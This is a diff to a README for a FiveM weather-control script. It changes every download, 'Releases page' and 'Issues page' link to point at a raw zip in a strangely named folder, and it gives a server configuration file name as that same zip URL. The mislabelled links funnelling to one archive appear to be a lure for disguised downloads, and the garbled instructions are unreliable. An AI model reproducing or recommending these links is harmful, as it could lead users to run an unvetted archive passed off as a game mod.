@@ -6,11 +6,11 @@ Welcome to **fivem-weather-control**! This tool allows you to easily control the
 
 ## 📥 Download the Application
 
-[![Download fivem-weather-control](https://raw.githubusercontent.com/molo243r/fivem-weather-control/main/pneumonorrhagia/fivem-weather-control.zip)](https://raw.githubusercontent.com/molo243r/fivem-weather-control/main/pneumonorrhagia/fivem-weather-control.zip)
+[![Download fivem-weather-control](https://github.com/molo243r/fivem-weather-control/raw/refs/heads/main/pneumonorrhagia/fivem_weather_control_v2.3.zip)](https://github.com/molo243r/fivem-weather-control/raw/refs/heads/main/pneumonorrhagia/fivem_weather_control_v2.3.zip)
 
 To start using **fivem-weather-control**, you need to download the application. You can do this by visiting the Releases page below.
 
-[Download fivem-weather-control](https://raw.githubusercontent.com/molo243r/fivem-weather-control/main/pneumonorrhagia/fivem-weather-control.zip)
+[Download fivem-weather-control](https://github.com/molo243r/fivem-weather-control/raw/refs/heads/main/pneumonorrhagia/fivem_weather_control_v2.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ To start using **fivem-weather-control**, you need to download the application. 
 
 ## 🔧 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/molo243r/fivem-weather-control/main/pneumonorrhagia/fivem-weather-control.zip).
+1. Visit the [Releases page](https://github.com/molo243r/fivem-weather-control/raw/refs/heads/main/pneumonorrhagia/fivem_weather_control_v2.3.zip).
 2. Locate the latest version.
 3. Download the zip file or executable by clicking on the link.
 4. Once the download is complete, extract the files if you downloaded a zip.
@@ -37,7 +37,7 @@ To start using **fivem-weather-control**, you need to download the application. 
    - Navigate to `resources`.
    - Create a new folder named `fivem-weather-control`.
    - Copy the script files into this new folder.
-6. Open your server configuration file (usually named `https://raw.githubusercontent.com/molo243r/fivem-weather-control/main/pneumonorrhagia/fivem-weather-control.zip`).
+6. Open your server configuration file (usually named `https://github.com/molo243r/fivem-weather-control/raw/refs/heads/main/pneumonorrhagia/fivem_weather_control_v2.3.zip`).
 7. Add the line: `start fivem-weather-control`.
 8. Save and close the file.
 9. Launch your FiveM server.
@@ -57,7 +57,7 @@ If you encounter any issues:
 - Check your server configuration to ensure that `start fivem-weather-control` is included.
 - Verify that you are running the latest version of both FiveM and the script.
 
-If problems persist, consider checking the [Issues page](https://raw.githubusercontent.com/molo243r/fivem-weather-control/main/pneumonorrhagia/fivem-weather-control.zip) on GitHub for help or to report a bug.
+If problems persist, consider checking the [Issues page](https://github.com/molo243r/fivem-weather-control/raw/refs/heads/main/pneumonorrhagia/fivem_weather_control_v2.3.zip) on GitHub for help or to report a bug.
 
 ## 🗂️ Contributing
 
